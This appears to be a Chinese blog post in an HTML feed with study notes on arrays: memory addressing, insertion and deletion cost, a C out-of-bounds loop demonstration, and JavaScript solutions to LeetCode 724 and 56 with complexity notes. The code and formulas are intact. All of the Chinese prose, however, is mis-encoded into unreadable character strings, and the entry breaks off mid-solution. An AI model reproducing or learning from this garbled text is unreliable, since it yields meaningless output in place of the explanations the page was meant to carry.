    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ¬æ–‡æ˜¯æ ¹æ®æå®¢æ—¶é—´ç‹äº‰è€å¸ˆçš„<a href="https://time.geekbang.org/column/intro/100017301">ã€Šæ•°æ®ç»“æ„ä¸ç®—æ³•ä¹‹ç¾ã€‹</a>ä½œçš„ç¬”è®°ï¼Œåç»­å°†è¡¥å……LeetCodeçš„é¢˜ç›®å’Œåˆ·é¢˜è¿‡ç¨‹ï¼Œéƒ¨åˆ†é¢˜è§£å‚è€ƒ<a href="http://www.conardli.top/docs/">awesome-coding-js</a>ã€‚ï¼ˆä¾µæƒåˆ ï¼‰</p><h1 id="æ•°ç»„éƒ¨åˆ†"><a href="#æ•°ç»„éƒ¨åˆ†" class="headerlink" title="æ•°ç»„éƒ¨åˆ†"></a>æ•°ç»„éƒ¨åˆ†</h1><h2 id="æ•°ç»„å®šä¹‰"><a href="#æ•°ç»„å®šä¹‰" class="headerlink" title="æ•°ç»„å®šä¹‰"></a>æ•°ç»„å®šä¹‰</h2><p>æ•°ç»„ï¼ˆArrayï¼‰æ˜¯ä¸€ç§<strong>çº¿æ€§è¡¨</strong>æ•°æ®ç»“æ„ã€‚å®ƒç”¨ä¸€ç»„è¿ç»­çš„å†…å­˜ç©ºé—´ï¼Œæ¥å­˜å‚¨ä¸€ç»„å…·æœ‰ç›¸åŒç±»å‹çš„æ•°æ®ã€‚</p><p>ç¬¬ä¸€æ˜¯<strong>çº¿æ€§è¡¨</strong>ï¼ˆLinear Listï¼‰ã€‚é¡¾åæ€ä¹‰ï¼Œçº¿æ€§è¡¨å°±æ˜¯æ•°æ®æ’æˆåƒä¸€æ¡çº¿ä¸€æ ·çš„ç»“æ„ã€‚æ¯ä¸ªçº¿æ€§è¡¨ä¸Šçš„æ•°æ®æœ€å¤šåªæœ‰å‰å’Œåä¸¤ä¸ªæ–¹å‘ã€‚å…¶å®é™¤äº†æ•°ç»„ï¼Œé“¾è¡¨ã€é˜Ÿåˆ—ã€æ ˆç­‰ä¹Ÿæ˜¯çº¿æ€§è¡¨ç»“æ„ã€‚è€Œä¸å®ƒç›¸å¯¹ç«‹çš„æ¦‚å¿µæ˜¯<strong>éçº¿æ€§è¡¨</strong>ï¼Œæ¯”å¦‚äºŒå‰æ ‘ã€å †ã€å›¾ç­‰ã€‚ä¹‹æ‰€ä»¥å«éçº¿æ€§ï¼Œæ˜¯å› ä¸ºï¼Œåœ¨éçº¿æ€§è¡¨ä¸­ï¼Œæ•°æ®ä¹‹é—´å¹¶ä¸æ˜¯ç®€å•çš„å‰åå…³ç³»ã€‚</p><p>ç¬¬äºŒä¸ªæ˜¯<strong>è¿ç»­çš„å†…å­˜ç©ºé—´å’Œç›¸åŒç±»å‹çš„æ•°æ®</strong>ã€‚æ­£æ˜¯å› ä¸ºè¿™ä¸¤ä¸ªé™åˆ¶ï¼Œå®ƒæ‰æœ‰äº†ä¸€ä¸ªå ªç§°â€œæ€æ‰‹é”â€çš„ç‰¹æ€§ï¼šâ€œéšæœºè®¿é—®â€ã€‚ä½†æœ‰åˆ©å°±æœ‰å¼Šï¼Œè¿™ä¸¤ä¸ªé™åˆ¶ä¹Ÿè®©æ•°ç»„çš„å¾ˆå¤šæ“ä½œå˜å¾—éå¸¸ä½æ•ˆï¼Œæ¯”å¦‚è¦æƒ³åœ¨æ•°ç»„ä¸­åˆ é™¤ã€æ’å…¥ä¸€ä¸ªæ•°æ®ï¼Œä¸ºäº†ä¿è¯è¿ç»­æ€§ï¼Œå°±éœ€è¦åšå¤§é‡çš„æ•°æ®æ¬ç§»å·¥ä½œã€‚</p><h3 id="æ•°ç»„æ˜¯å¦‚ä½•å®ç°æ ¹æ®ä¸‹æ ‡éšæœºè®¿é—®æ•°ç»„å…ƒç´ ï¼Ÿ"><a href="#æ•°ç»„æ˜¯å¦‚ä½•å®ç°æ ¹æ®ä¸‹æ ‡éšæœºè®¿é—®æ•°ç»„å…ƒç´ ï¼Ÿ" class="headerlink" title="æ•°ç»„æ˜¯å¦‚ä½•å®ç°æ ¹æ®ä¸‹æ ‡éšæœºè®¿é—®æ•°ç»„å…ƒç´ ï¼Ÿ"></a><strong>æ•°ç»„æ˜¯å¦‚ä½•å®ç°æ ¹æ®ä¸‹æ ‡éšæœºè®¿é—®æ•°ç»„å…ƒç´ ï¼Ÿ</strong></h3><p><code>a[i]_address = base_address + i * data_type_size</code></p><ul><li>æ•°ç»„é€‚åˆæŸ¥æ‰¾ï¼ŒæŸ¥æ‰¾æ—¶é—´å¤æ‚åº¦ä¸ºO(logn)(æ’å¥½åºçš„æ•°ç»„ï¼ŒäºŒåˆ†æŸ¥æ‰¾)</li><li>æ•°ç»„æ”¯æŒéšæœºè®¿é—®ï¼Œæ ¹æ®ä¸‹æ ‡éšæœºè®¿é—®çš„æ—¶é—´å¤æ‚åº¦ä¸º O(1)</li></ul><h3 id="ä½æ•ˆçš„â€œæ’å…¥â€å’Œâ€œåˆ é™¤â€"><a href="#ä½æ•ˆçš„â€œæ’å…¥â€å’Œâ€œåˆ é™¤â€" class="headerlink" title="ä½æ•ˆçš„â€œæ’å…¥â€å’Œâ€œåˆ é™¤â€"></a>ä½æ•ˆçš„â€œæ’å…¥â€å’Œâ€œåˆ é™¤â€</h3><h4 id="æ’å…¥æ“ä½œ"><a href="#æ’å…¥æ“ä½œ" class="headerlink" title="æ’å…¥æ“ä½œ"></a><strong>æ’å…¥</strong>æ“ä½œ</h4><p>å‡è®¾æ•°ç»„çš„é•¿åº¦ä¸º nï¼Œå¦‚æœå°†ä¸€ä¸ªæ•°æ®æ’å…¥åˆ°æ•°ç»„ä¸­çš„ç¬¬ k ä¸ªä½ç½®ã€‚æˆ‘ä»¬éœ€å°†ç¬¬ kï½n è¿™éƒ¨åˆ†çš„å…ƒç´ éƒ½é¡ºåºåœ°å¾€åæŒªä¸€ä½ã€‚</p><p>å¦‚æœåœ¨æ•°ç»„çš„æœ«å°¾æ’å…¥å…ƒç´ ï¼Œé‚£å°±ä¸éœ€è¦ç§»åŠ¨æ•°æ®ï¼Œæ—¶é—´å¤æ‚åº¦ä¸º O(1)ã€‚ä½†å¦‚æœåœ¨æ•°ç»„çš„å¼€å¤´æ’å…¥å…ƒç´ ï¼Œé‚£æ‰€æœ‰çš„æ•°æ®éƒ½éœ€è¦ä¾æ¬¡å¾€åç§»åŠ¨ä¸€ä½ï¼Œæœ€åæ—¶é—´å¤æ‚åº¦æ˜¯ O(n)ã€‚ å› ä¸ºæ¯ä¸ªä½ç½®æ’å…¥å…ƒç´ çš„æ¦‚ç‡ä¸€æ ·ï¼Œæ‰€ä»¥å¹³å‡æ—¶é—´å¤æ‚åº¦ä¸º (1+2+â€¦n)/n=O(n)ã€‚</p><p><strong>è¿˜æœ‰ä¸€ä¸ªç®€å•çš„åŠæ³•</strong>:ç›´æ¥å°†ç¬¬ k ä½çš„æ•°æ®ç§»åˆ°æ•°ç»„å…ƒç´ çš„æœ€åï¼ŒæŠŠæ–°çš„å…ƒç´ ç›´æ¥æ”¾å…¥ç¬¬ k ä¸ªä½ç½®ï¼Œè¿™æ ·æ—¶é—´å¤æ‚åº¦å°±ä¼šé™ä¸º O(1)ã€‚</p><h4 id="åˆ é™¤æ“ä½œ"><a href="#åˆ é™¤æ“ä½œ" class="headerlink" title="åˆ é™¤æ“ä½œ"></a><strong>åˆ é™¤æ“ä½œ</strong></h4><p>å’Œæ’å…¥ç±»ä¼¼ï¼Œå¦‚æœåˆ é™¤æ•°ç»„æœ«å°¾çš„æ•°æ®ï¼Œåˆ™æœ€å¥½æƒ…å†µæ—¶é—´å¤æ‚åº¦ä¸º O(1)ï¼›å¦‚æœåˆ é™¤å¼€å¤´çš„æ•°æ®ï¼Œåˆ™æœ€åæƒ…å†µæ—¶é—´å¤æ‚åº¦ä¸º O(n)ï¼›å¹³å‡æƒ…å†µæ—¶é—´å¤æ‚åº¦ä¹Ÿä¸º O(n)ã€‚</p><p><strong>æé«˜æ•ˆç‡çš„æ–¹æ³•ï¼š</strong>ä¸ºäº†é¿å…å‰©ä½™æ•°æ®å¤šæ¬¡æ¬ç§»ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆè®°å½•å·²ç»åˆ é™¤çš„æ•°æ®ã€‚æ¯æ¬¡çš„åˆ é™¤æ“ä½œå¹¶ä¸æ˜¯çœŸæ­£åœ°æ¬ç§»æ•°æ®ï¼Œåªæ˜¯è®°å½•æ•°æ®å·²ç»è¢«åˆ é™¤ã€‚å½“æ•°ç»„æ²¡æœ‰æ›´å¤šç©ºé—´å­˜å‚¨æ•°æ®æ—¶ï¼Œå†è§¦å‘æ‰§è¡Œä¸€æ¬¡çœŸæ­£çš„åˆ é™¤æ“ä½œï¼Œè¿™æ ·å°±å¤§å¤§å‡å°‘äº†åˆ é™¤æ“ä½œå¯¼è‡´çš„æ•°æ®æ¬ç§»ã€‚</p><h3 id="æ•°ç»„çš„è®¿é—®è¶Šç•Œé—®é¢˜"><a href="#æ•°ç»„çš„è®¿é—®è¶Šç•Œé—®é¢˜" class="headerlink" title="æ•°ç»„çš„è®¿é—®è¶Šç•Œé—®é¢˜"></a>æ•°ç»„çš„è®¿é—®è¶Šç•Œé—®é¢˜</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(; i&lt;=<span class="number">3</span>; i++)&#123;</span><br><span class="line">        arr[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello world\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™æ®µä»£ç çš„è¿è¡Œç»“æœå¹¶éæ˜¯æ‰“å°ä¸‰è¡Œâ€œhello wordâ€ï¼Œè€Œæ˜¯ä¼šæ— é™æ‰“å°â€œhello worldâ€ã€‚</p><p>å› ä¸ºåœ¨ C è¯­è¨€ä¸­ï¼Œåªè¦ä¸æ˜¯è®¿é—®å—é™çš„å†…å­˜ï¼Œæ‰€æœ‰çš„å†…å­˜ç©ºé—´éƒ½æ˜¯å¯ä»¥è‡ªç”±è®¿é—®çš„ã€‚a[3] è¢«å®šä½åˆ°æŸå—ä¸å±äºæ•°ç»„çš„å†…å­˜åœ°å€ä¸Šï¼Œè€Œè¿™ä¸ªåœ°å€æ­£å¥½æ˜¯å­˜å‚¨å˜é‡ i çš„å†…å­˜åœ°å€ï¼Œé‚£ä¹ˆ a[3]=0 å°±ç›¸å½“äº i=0ï¼Œæ‰€ä»¥å°±ä¼šå¯¼è‡´ä»£ç æ— é™å¾ªç¯ã€‚</p><h3 id="ä¸ºä»€ä¹ˆå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ•°ç»„ä»-0-å¼€å§‹ç¼–å·å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ•°ç»„ä»-0-å¼€å§‹ç¼–å·å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ•°ç»„ä» 0 å¼€å§‹ç¼–å·å‘¢ï¼Ÿ"></a><strong>ä¸ºä»€ä¹ˆå¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œæ•°ç»„ä» 0 å¼€å§‹ç¼–å·å‘¢ï¼Ÿ</strong></h3><p>ä»æ•°ç»„å­˜å‚¨çš„å†…å­˜æ¨¡å‹ä¸Šæ¥çœ‹ï¼Œâ€œä¸‹æ ‡â€æœ€ç¡®åˆ‡çš„å®šä¹‰åº”è¯¥æ˜¯â€œåç§»ï¼ˆoffsetï¼‰â€ã€‚å¦‚æœç”¨ a æ¥è¡¨ç¤ºæ•°ç»„çš„é¦–åœ°å€ï¼Œa[0] å°±æ˜¯åç§»ä¸º 0 çš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯é¦–åœ°å€ï¼Œa[k] å°±è¡¨ç¤ºåç§» k ä¸ª type_size çš„ä½ç½®ï¼Œæ‰€ä»¥è®¡ç®— a[k] çš„å†…å­˜åœ°å€åªéœ€è¦ç”¨è¿™ä¸ªå…¬å¼ï¼š<code>a[k]_address = base_address + k * type_size</code>ã€‚ä½†æ˜¯ï¼Œå¦‚æœæ•°ç»„ä» 1 å¼€å§‹è®¡æ•°ï¼Œé‚£æˆ‘ä»¬è®¡ç®—æ•°ç»„å…ƒç´  a[k] çš„å†…å­˜åœ°å€å°±ä¼šå˜ä¸ºï¼š<code>a[k]_address = base_address + (k-1)*type_size</code>ã€‚å¯¹äº CPU æ¥è¯´ï¼Œ<strong>å¤šäº†ä¸€æ¬¡å‡æ³•æŒ‡ä»¤</strong>ã€‚</p><h2 id="LeetCode724â€”â€”å¯»æ‰¾æ•°ç»„çš„ä¸­å¿ƒç´¢å¼•ï¼ˆâ˜†ï¼‰"><a href="#LeetCode724â€”â€”å¯»æ‰¾æ•°ç»„çš„ä¸­å¿ƒç´¢å¼•ï¼ˆâ˜†ï¼‰" class="headerlink" title="LeetCode724â€”â€”å¯»æ‰¾æ•°ç»„çš„ä¸­å¿ƒç´¢å¼•ï¼ˆâ˜†ï¼‰"></a>LeetCode724â€”â€”å¯»æ‰¾æ•°ç»„çš„ä¸­å¿ƒç´¢å¼•ï¼ˆâ˜†ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/find-pivot-index/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç "><a href="#è‡ªå·±çš„ä»£ç " class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pivotIndex = <span class="function"><span class="keyword">function</span> (<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (index &lt; nums.length) &#123;</span><br><span class="line">        <span class="keyword">var</span> sum1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">var</span> sum2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; index; i++)&#123;</span><br><span class="line">            sum1+=nums[i]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> j = index+<span class="number">1</span>; j &lt; nums.length; j++)&#123;</span><br><span class="line">            sum2+=nums[j]</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sum1 == sum2) &#123;</span><br><span class="line">            <span class="keyword">return</span> index;</span><br><span class="line">        &#125;</span><br><span class="line">        index++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åªæƒ³åˆ°ç”¨å¾ªç¯å°†å‰åsumæ±‚å‡ºæ¥ï¼Œç„¶ååˆ¤æ–­ã€‚ã€‚</p><h3 id="æ€è·¯-amp-é¢˜è§£"><a href="#æ€è·¯-amp-é¢˜è§£" class="headerlink" title="æ€è·¯&amp;é¢˜è§£"></a><strong>æ€è·¯</strong>&amp;é¢˜è§£</h3><p>è®°æ•°ç»„çš„å…¨éƒ¨å…ƒç´ ä¹‹å’Œä¸º totalï¼Œå½“éå†åˆ°ç¬¬ i ä¸ªå…ƒç´ æ—¶ï¼Œè®¾å…¶å·¦ä¾§å…ƒç´ ä¹‹å’Œä¸º sumï¼Œåˆ™å…¶å³ä¾§å…ƒç´ ä¹‹å’Œä¸º total-num_si-sumã€‚å·¦å³ä¾§å…ƒç´ ç›¸ç­‰å³ä¸º sum=total-num_si-sumã€‚å³ 2* sum+num_si=totalã€‚</p><p>å½“ä¸­å¿ƒç´¢å¼•å·¦ä¾§æˆ–å³ä¾§æ²¡æœ‰å…ƒç´ æ—¶ï¼Œå³ä¸ºé›¶ä¸ªé¡¹ç›¸åŠ ï¼Œè¿™åœ¨æ•°å­¦ä¸Šç§°ä½œã€Œç©ºå’Œã€ï¼ˆempty sumï¼‰ã€‚åœ¨ç¨‹åºè®¾è®¡ä¸­æˆ‘ä»¬çº¦å®šã€Œç©ºå’Œæ˜¯é›¶ã€ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pivotIndex = <span class="function"><span class="keyword">function</span>(<span class="params">nums</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> total = nums.reduce(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">2</span> * sum + nums[i] === total) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        sum += nums[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ"><a href="#å¤æ‚åº¦åˆ†æ" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a><strong>å¤æ‚åº¦åˆ†æ</strong></h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(n)ï¼Œå…¶ä¸­ nä¸ºæ•°ç»„çš„é•¿åº¦ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(1)ã€‚</li></ul><h2 id="LeetCode56â€”â€”åˆå¹¶åŒºé—´ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰"><a href="#LeetCode56â€”â€”åˆå¹¶åŒºé—´ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰" class="headerlink" title="LeetCode56â€”â€”åˆå¹¶åŒºé—´ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰"></a>LeetCode56â€”â€”åˆå¹¶åŒºé—´ï¼ˆâ˜†â˜†ï¼‰ï¼ˆé«˜é¢‘ï¼‰</h2><p><a href="https://leetcode-cn.com/problems/merge-intervals/">è·³è½¬åœ°å€</a></p><h3 id="è‡ªå·±çš„ä»£ç -1"><a href="#è‡ªå·±çš„ä»£ç -1" class="headerlink" title="è‡ªå·±çš„ä»£ç "></a>è‡ªå·±çš„ä»£ç </h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; intervals.length; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (intervals[i][<span class="number">1</span>] &lt; intervals[i + <span class="number">1</span>][<span class="number">0</span>]) &#123;</span><br><span class="line">            arr.push(intervals[i])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr.push([intervals[i][<span class="number">0</span>],intervals[i+<span class="number">1</span>][<span class="number">1</span>]])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æœªACï¼Œåªä¼šå¯¹ä¼ å…¥çš„æ•°ç»„è¿›è¡Œåˆ¤æ–­ï¼Œå¦‚æœèƒ½è€ƒè™‘åˆ°æ€è·¯1é‚£æ ·ï¼Œå¯¹mergeçš„æ•°ç»„è¿›è¡Œè¾¹ç•Œåˆ¤æ–­å°±å¥½äº†ã€‚</p><h3 id="æ€è·¯1-amp-é¢˜è§£"><a href="#æ€è·¯1-amp-é¢˜è§£" class="headerlink" title="æ€è·¯1&amp;é¢˜è§£"></a>æ€è·¯1&amp;é¢˜è§£</h3><p>ä½¿ç”¨æ’åº,æŒ‰ç…§åŒºé—´çš„å·¦ç«¯ç‚¹è¿›è¡Œæ’åºï¼Œé‚£ä¹ˆåœ¨æ’å®Œåºçš„åˆ—è¡¨ä¸­ï¼Œå¯ä»¥åˆå¹¶çš„åŒºé—´ä¸€å®šæ˜¯è¿ç»­çš„ã€‚ä½¿ç”¨æ•°ç»„reså­˜å‚¨æœ€ç»ˆçš„ç­”æ¡ˆã€‚</p><p>é¦–å…ˆï¼Œå°†åˆ—è¡¨ä¸­çš„åŒºé—´æŒ‰ç…§å·¦ç«¯ç‚¹å‡åºæ’åˆ—ï¼Œç„¶åæˆ‘ä»¬å°†ç¬¬ä¸€ä¸ªåŒºé—´åŠ å…¥ merged æ•°ç»„,å¹¶æŒ‰ç…§é¡ºåºä¾æ¬¡è€ƒè™‘ä¹‹åçš„æ¯ä¸ªåŒºé—´ã€‚</p><p>å¦‚æœå½“å‰åŒºé—´çš„å·¦ç«¯ç‚¹åœ¨æ•°ç»„ mergedä¸­æœ€åä¸€ä¸ªåŒºé—´çš„å³ç«¯ç‚¹ä¹‹åï¼Œé‚£ä¹ˆä»–ä»¬ä¸ä¼šé‡åˆï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†è¿™ä¸ªåŒºé—´åŠ å…¥æ•°ç»„ mergedçš„æœ«å°¾ã€‚</p><p>å¦åˆ™,å®ƒä»¬é‡åˆï¼Œæˆ‘ä»¬éœ€è¦ç”¨å½“å‰åŒºé—´çš„å³ç«¯ç‚¹æ›´æ–°æ•°ç»„ merged ä¸­æœ€åä¸€ä¸ªåŒºé—´çš„å³ç«¯ç‚¹ï¼Œå°†å…¶ç½®ä¸ºäºŒè€…çš„è¾ƒå¤§å€¼ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// å¦‚æœä¼ é€’è¿›æ¥çš„æ•°ç»„é•¿åº¦ä¸º0 è¿”å›ä¸€ä¸ªç©ºæ•°ç»„</span></span><br><span class="line">    <span class="keyword">if</span> (intervals.length === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> res = []</span><br><span class="line">    intervals.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a[<span class="number">0</span>]-b[<span class="number">0</span>])</span><br><span class="line">    res.push(intervals[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">// ä»åŸæ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ è¿›è¡Œéå†</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &lt; intervals.length; i++) &#123;</span><br><span class="line">      <span class="comment">// å¦‚æœå½“å‰åŒºé—´çš„å·¦ç«¯ç‚¹ å¤§äº mergeæ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ çš„å³ç«¯ç‚¹</span></span><br><span class="line">      <span class="keyword">if</span> (intervals[i][<span class="number">0</span>] &gt; res[res.length - <span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">        <span class="comment">// è¯´æ˜è¿™ä¸ªæ•°ç»„å¯ä»¥ç›´æ¥æ”¾è¿›mergeæ•°ç»„ä¸­</span></span><br><span class="line">        res.push(intervals[i])</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123; <span class="comment">// è¯´æ˜æœ‰åŒºé—´æœ‰äº¤é›† å½“å‰åŒºé—´çš„å·¦ç«¯ç‚¹å°äºç­‰äºæœ€åä¸€ä¸ªå…ƒç´ çš„å³ç«¯ç‚¹</span></span><br><span class="line">        <span class="comment">// å¦‚æœå½“å‰åŒºé—´çš„å³ç«¯ç‚¹ å¤§äº merge æœ€åä¸€ä¸ªå³ç«¯ç‚¹</span></span><br><span class="line">        <span class="keyword">if</span> (intervals[i][<span class="number">1</span>] &gt; res[res.length - <span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">          <span class="comment">// æ›´æ–°å³ç«¯ç‚¹ä¸ºæœ€å¤§å€¼</span></span><br><span class="line">          res[res.length - <span class="number">1</span>][<span class="number">1</span>] = intervals[i][<span class="number">1</span>]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="å¤æ‚åº¦åˆ†æ-1"><a href="#å¤æ‚åº¦åˆ†æ-1" class="headerlink" title="å¤æ‚åº¦åˆ†æ"></a>å¤æ‚åº¦åˆ†æ</h3><ul><li>æ—¶é—´å¤æ‚åº¦ï¼šO(nlogn)ï¼Œå…¶ä¸­ n ä¸ºåŒºé—´çš„æ•°é‡ã€‚é™¤å»æ’åºçš„å¼€é”€ï¼Œæˆ‘ä»¬åªéœ€è¦ä¸€æ¬¡çº¿æ€§æ‰«æï¼Œæ‰€ä»¥ä¸»è¦çš„æ—¶é—´å¼€é”€æ˜¯æ’åºçš„ O(nlogn)ã€‚</li><li>ç©ºé—´å¤æ‚åº¦ï¼šO(logn)ï¼Œå…¶ä¸­ nä¸ºåŒºé—´çš„æ•°é‡ã€‚è¿™é‡Œè®¡ç®—çš„æ˜¯å­˜å‚¨ç­”æ¡ˆä¹‹å¤–ï¼Œä½¿ç”¨çš„é¢å¤–ç©ºé—´ã€‚O(logn) å³ä¸ºæ’åºæ‰€éœ€è¦çš„ç©ºé—´å¤æ‚åº¦ã€‚</li></ul><h3 id="æ€è·¯2-amp-é¢˜è§£"><a href="#æ€è·¯2-amp-é¢˜è§£" class="headerlink" title="æ€è·¯2&amp;é¢˜è§£"></a>æ€è·¯2&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span> (<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (intervals.length === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line">    &#125;</span><br><span class="line">    intervals.sort(<span class="function">(<span class="params">a,b</span>)=&gt;</span>a[<span class="number">0</span>]-b[<span class="number">0</span>])</span><br><span class="line">    <span class="comment">// æ³¨æ„è¿™é‡Œå¯¹åŒä¸€ä¸ªæ•°ç»„è¿›è¡Œäº†è¯»å†™æ“ä½œ</span></span><br><span class="line">    <span class="comment">// å­˜åœ¨i+1æ“ä½œ æ‰€ä»¥intervals.length-1</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;intervals.length-<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(intervals[i][<span class="number">1</span>]&gt;=intervals[i+<span class="number">1</span>][<span class="number">0</span>])&#123;</span><br><span class="line">          <span class="comment">// æ ¹æ®è§„å¾‹ è¯´æ˜è¿™ä¸ªåŒºé—´å¯ä»¥åˆå¹¶</span></span><br><span class="line">           <span class="keyword">const</span> data = [...intervals[i],...intervals[i+<span class="number">1</span>]]</span><br><span class="line">           <span class="keyword">const</span> item = [<span class="built_in">Math</span>.min(...data), <span class="built_in">Math</span>.max(...data)];</span><br><span class="line">           intervals.splice(i, <span class="number">2</span>, item);</span><br><span class="line">           i--; <span class="comment">// å›é€€æ“ä½œ çœ‹çœ‹æ–°è°ƒæ•´çš„åŒºé—´å¯ä»¥è·Ÿåé¢çš„åˆå¹¶ä¸</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> intervals</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>éœ€è¦å¾ˆæ‰å®çš„jsåŸºç¡€ã€‚ã€‚ã€‚çœŸçš„å¾ˆéš¾æƒ³åˆ°</p><h3 id="æ€è·¯3-amp-é¢˜è§£"><a href="#æ€è·¯3-amp-é¢˜è§£" class="headerlink" title="æ€è·¯3&amp;é¢˜è§£"></a>æ€è·¯3&amp;é¢˜è§£</h3><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> merge = <span class="function"><span class="keyword">function</span>(<span class="params">intervals</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!intervals.length) <span class="keyword">return</span> [];</span><br><span class="line">    intervals.sort(<span class="function">(<span class="params">a, b</span>) =&gt;</span> a[<span class="number">0</span>] - b[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">const</span> result = [intervals[<span class="number">0</span>]];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> [start, end] <span class="keyword">of</span> intervals) &#123;</span><br><span class="line">        <span class="keyword">if</span>(start &lt;= result[result.length - <span class="number">1</span>][<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">const</span> [startPrev, endPrev] = result.pop();</span><br><span class="line">            result.push([startPrev, <span class="built_in">Math</span>.max(end, endPrev)]);</span><br><span class="line">        &#125; <span class="keyword">else</span> result.push([start, 